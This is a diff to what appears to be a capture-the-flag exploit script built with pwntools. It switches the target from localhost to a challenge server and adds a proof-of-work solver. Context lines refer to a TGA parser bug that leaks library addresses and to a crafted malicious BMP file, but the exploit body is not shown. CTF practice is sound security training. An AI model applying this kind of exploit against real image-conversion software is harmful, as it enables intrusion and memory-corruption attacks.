@@ -1,6 +1,6 @@
 from pwn import *
 # context.log_level = 'debug'
-r = remote('localhost', 20010)
+r = remote('chall.pwnable.hk', 20010)
 
 # r = process('./chall')
 # gdb.attach(r, 'b input-bmp.c:665\nc 3\np temp')
@@ -8,6 +8,18 @@ r = remote('localhost', 20010)
 # ====
 
 # utils
+def verify_hash(prefix, answer, difficulty):
+    h = hashlib.sha256()
+    h.update((prefix + answer).encode())
+    bits = ''.join(bin(i)[2:].zfill(8) for i in h.digest())
+    return bits.startswith('0' * difficulty)
+
+def solve_pow(prefix, difficulty):
+    i = 0
+    while not verify_hash(prefix, str(i), difficulty):
+        i += 1
+    return str(i)
+
 def get_file_format(file_name):
     return file_name.split('.')[-1]
 
@@ -84,6 +96,10 @@ def craft_exploit_bmp_file(libc_base, lib_top):
             fow3.write(overwrite3_content)
 
 # ====
+r.recvuntil(b'sha256(')
+prefix = r.recvuntil(b' + ')[:-3]
+answer = solve_pow(prefix.decode(), 22)
+r.sendline(answer)
 
 # leak libs info by tga parser bug
 leak = convert(r, './payload/leak0.tga', 'svg')
